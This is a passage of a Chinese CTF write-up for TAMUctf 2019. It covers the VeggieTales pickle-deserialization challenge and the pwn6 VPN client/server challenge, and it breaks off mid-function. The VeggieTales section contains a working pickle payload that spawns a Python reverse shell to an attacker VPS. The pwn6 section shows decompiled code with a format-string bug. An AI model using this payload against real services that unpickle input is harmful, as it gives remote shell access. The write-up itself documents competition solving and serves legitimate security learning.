# TAMUctf2019-pwn-writeup
pwn1-5的题目不难，之前已经有师傅发过writeup了，现在我把剩余两题pwn的writeup补充一下。
## VeggieTales
题目描述：
    It's my favorite show to watch while practicing my python skills! I've seen episode 5 at least 13 times.
    nc pwn.tamuctf.com 8448
    Difficulty: easy-medium
    2.23 1:58 pm CST: Added hint to description
题目没有给elf，根据题目描述，应该是一个python写的应用，nc过去看一下
    Do you like VeggieTales??
    1. Add an episode to your watched list
    2. Print your watch list
    3. Backup your watch list
    4. Load your watch list
菜单功能：
  1. 添加看过的剧集，只能输入1-47
  2. 打印已看过的剧集
  3. 备份当前清单，会返回一串base64
  4. 输入备份得到的那串base64，可恢复已看剧集清单
简单fuzz了一下，没发现什么漏洞，后来题目给出了提示`I've seen episode 5 at least 13
times.`，看一下第5部ep是`5. Dave and the Giant Pickle`，马上联想到是python pickle反序列化！
首先添加一部剧集，拿到一串base64进行分析，尝试直接使用pickle反序列化出现报错
    Traceback (most recent call last):
      File "X:\tmp\pwn7.py", line 69, in 
        print(pickle.loads(base64.b64decode(s)))
    _pickle.UnpicklingError: invalid load key, '\xb4'.
对比了一下正常的序列化字符串，发现要先经过ROT13后再base64decode，修改一下代码再次测试。
    import base64, string, pickle, codecs
    s = "tNAqpDOLUDNNNQHhVPORLKMyVTShMPO0nTHtE2yuoaDtHTywn2kypDSuYt=="
    print(pickle.loads(base64.b64decode(codecs.encode(s,"rot-13"))))
    # ['5.  Dave and the Giant Pickle']
根据以上分析，我们直接写一个反弹shell的payload，然后在`Load your watch list`那里进行反序列化
    import base64, string, pickle, codecs, platform
    class Exploit(object):
        def __reduce__(self):
            return (platform.popen,("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"vps\",20004));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",))
    def serialize_exploit():
        shellcode = pickle.dumps(Exploit())
        return shellcode
    exp = codecs.encode(str(base64.b64encode(serialize_exploit())),"rot-13")
    print(exp)
本地监听端口，另一边输入生成的exp，成功反弹回来（你需要一个有公网ip的vps）
## pwn6
题目描述：
    Setup the VPN and use the client to connect to the server.
    The servers ip address on the vpn is 172.30.0.2
    Difficulty: hard
    2/23 10:06 am: Added server ip
题目给了一个openvpn的配置文件，以及client和server的二进制文件。
程序保护情况：
    [*] '/tmp/client'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    [*] '/tmp/server'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
        FORTIFY:  Enabled
openvpn安装使用方法：
    sudo apt-get install -y openvpn
    cp pwn6.ovpn /etc/openvpn/
    sudo openvpn pwn6.ovpn
尝试运行一下client，程序提供两个选项，选项0没什么用，选项1进行登陆，由于没账号密码，输入后提示账号无效，还是直接看二进制文件分析吧。
    0. View Recent Login's With client
         1. Login
    Enter command to send to server...
由于flag存在server端，我们最终的目标还是要pwn掉server，因此先对server进行分析。server程序功能非常多，里面有不少sql操作，一度往数据库注入方向想，后来一想这是pwn题，不要走歪了。之后在server中发现一个叫`process_message`函数，看程序逻辑，应该就是处理client发送信息的函数。
    signed __int64 __fastcall process_message(struct server *a1, unsigned int *a2)
    {
      unsigned int v2; // ST14_4
      signed __int64 result; // rax
      __int64 v4; // ST00_8
      __int64 v5; // [rsp+18h] [rbp-8h]
      v5 = *((_QWORD *)a2 + 1);                     // send_data
      if ( *(_QWORD *)&a2[2 * (*(unsigned int *)(v5 + 4) + 4LL) + 2] )
      {
        v2 = (*(__int64 (__fastcall **)(struct server *, unsigned int *))&a2[2 * (*(unsigned int *)(v5 + 4) + 4LL) + 2])(
               a1,
               a2);
        printf("Result of action was %i\n", v2, a2);
        result = v2;
      }
      else
      {
        printf("Unauthorized Command for Client %i\n", *a2, a2);
        printf((const char *)(*(_QWORD *)(v4 + 8) + 8LL));  // fmt
        result = 0xFFFFFFFFLL;
      }
      return result;
这里有一个很明显的格式化字符串漏洞，不过要运行到漏洞分支，需要绕过`if`的判断，目前还不清楚client发包的结构，因此转到分析client的程序，从client入手分析发包过程。定位到client登陆操作用到的函数中：
    signed __int64 __fastcall send_login(int *a1)
    {
      unsigned __int8 user_len; // ST1F_1
      unsigned __int8 pwd_len; // ST1E_1
      char passwd[256]; // [rsp+20h] [rbp-310h]
      char user[520]; // [rsp+120h] [rbp-210h]
      _BYTE *send_data; // [rsp+328h] [rbp-8h]
      puts("Input Username for login:");
      prompt_string(user, 256);
      puts("Input Password for login:");
      prompt_string(passwd, 256);
      send_data = malloc(0x202uLL);
      user_len = strlen(user) - 1;
      pwd_len = strlen(passwd) - 1;
      user[user_len] = 0;
      passwd[pwd_len] = 0;
      *send_data = user_len;
      send_data[1] = pwd_len;
      memcpy(send_data + 2, user, user_len);
      memcpy(&send_data[user_len + 2], passwd, pwd_len);
      send_msg(a1, 0, send_data, user_len + pwd_len + 2);
      puts("Message sent to server.");
      read(*a1, a1 + 2, 4uLL);
      sleep(2u);
      if ( a1[2] < 0 )
        return 0xFFFFFFFELL;
      a1[1] = 1;
      return 1LL;
    }
    void __fastcall send_msg(int *a1, int a2, void *a3, unsigned int a4)
    {
      const void *src; // ST08_8
      unsigned int n; // ST10_4
      int v6; // [rsp+2Ch] [rbp-24h]